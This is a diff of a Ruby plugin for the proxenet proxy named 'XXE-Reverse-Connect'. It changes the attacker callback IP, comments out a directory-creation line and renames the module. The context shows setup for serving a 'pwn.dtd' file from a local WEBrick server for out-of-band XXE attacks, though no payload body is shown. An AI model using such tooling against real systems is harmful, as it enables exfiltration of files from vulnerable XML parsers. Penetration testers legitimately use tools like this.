@@ -6,7 +6,7 @@ require 'http/parser'
 # gem install unirest
 require 'unirest'
 
-$ipaddr       =   "172.16.29.1" # get_default_ipv4_addr()
+$ipaddr       = "10.8.161.55" # get_default_ipv4_addr()
 $port         = 3000
 $dir          = "/tmp/proxenet-xxe-payload"
 $dtd_file     = "pwn.dtd"
@@ -27,7 +27,7 @@ def setup_xxe_env()
   p = `ps aux | grep -v grep | grep 'ruby -rwebrick -e'`
   if p.nil? or p == ""
 
-    Dir.mkdir? $dir unless Dir.exist? $dir
+    # Dir.mkdir? $dir unless Dir.exist? $dir
 
     f = File.open($dir + "/" + $dtd_file,  'w')
     f.write("")
@@ -61,9 +61,9 @@ end
 setup_xxe_env()
 
 
-module XXE-Reverse-Connect
+module XxeReverseConnect
 
-  $PLUGIN_NAME = "XXE-Reverse-Connect"
+  $PLUGIN_NAME = "XxeReverseConnect"
   $AUTHOR = "thorgul"
 
   def proxenet_request_hook(request_id, request, uri)
